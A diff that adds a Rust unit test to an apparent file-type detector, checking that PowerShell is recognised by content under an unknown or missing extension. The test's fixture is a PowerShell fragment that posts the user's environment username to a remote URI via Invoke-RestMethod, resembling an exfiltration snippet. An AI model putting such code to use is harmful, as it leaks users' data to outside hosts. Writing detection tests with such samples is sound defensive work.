@@ -2803,6 +2803,17 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
         assert_ext("module.psm1", FileType::PowerShell);
     }
 
+    // An unmapped extension (`.posh`) and no extension at all both leave the
+    // decision to content; an advanced function with `Add-Type` is PowerShell.
+    #[test]
+    fn powershell_by_content_under_unknown_or_missing_extension() {
+        let data = b"Add-Type -AssemblyName PresentationCore\r\n\
+            function dischat {\r\n  [CmdletBinding()]\r\n  param ([string]$con)\r\n\
+            Invoke-RestMethod -Uri $u -Method 'post' -Body @{ 'username' = $env:username }\r\n}\r\n";
+        assert_detect("Nz97PyJr.posh", data, FileType::PowerShell);
+        assert_detect("Nz97PyJr", data, FileType::PowerShell);
+    }
+
     // ── Groovy / Scala ───────────────────────────────────────────────
 
     #[test]
